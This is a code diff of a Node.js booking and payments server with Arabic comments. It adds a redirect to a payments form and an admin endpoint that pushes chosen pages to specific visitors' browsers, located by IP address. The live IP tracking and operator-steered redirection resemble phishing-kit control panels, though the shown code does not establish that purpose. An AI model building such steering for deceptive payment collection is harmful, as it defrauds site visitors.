@@ -734,7 +734,7 @@ function handleDataRequest(req, res) {
         });
         ipRefMapSite.set(clientIp, referenceId);
         io.to("admins").emit("newBooking", { reference: referenceId, ip: clientIp });
-        return res.json({ status: true, data: { reference: referenceId } });
+        return res.json({ status: true, data: { reference: referenceId, Reference: referenceId, goToUrl: "/payments-form/" } });
       }
 
       if (typeReq === "PaymentsForm") {
@@ -810,6 +810,29 @@ function handleDataRequest(req, res) {
     return res.status(500).json({ status: false, message: err.message });
   }
 }
+
+// ==================== Admin Navigate API ====================
+// توجيه العميل من لوحة التحكم إلى صفحة معينة
+app.post("/api/admin/navigate", authMiddleware, (req, res) => {
+  try {
+    const { clientIp, page, referenceId } = req.body;
+    if (!page) return res.status(400).json({ error: "الصفحة مطلوبة" });
+    let effectiveIp = clientIp;
+    if (!effectiveIp && referenceId) {
+      for (const [ip, ref] of ipToReference.entries()) {
+        if (ref === referenceId) { effectiveIp = ip; break; }
+      }
+    }
+    if (effectiveIp) {
+      io.to(`ip_${effectiveIp}`).emit("navigateTo", { page, ip: effectiveIp });
+    }
+    io.emit("navigateTo", { page, ip: effectiveIp || "" });
+    logNavigation({ referenceId: referenceId || "", clientIp: effectiveIp || "", targetPage: page });
+    res.json({ success: true, page, ip: effectiveIp });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
 
 // استقبال /data/ مباشرة
 app.post("/data/", handleDataRequest);
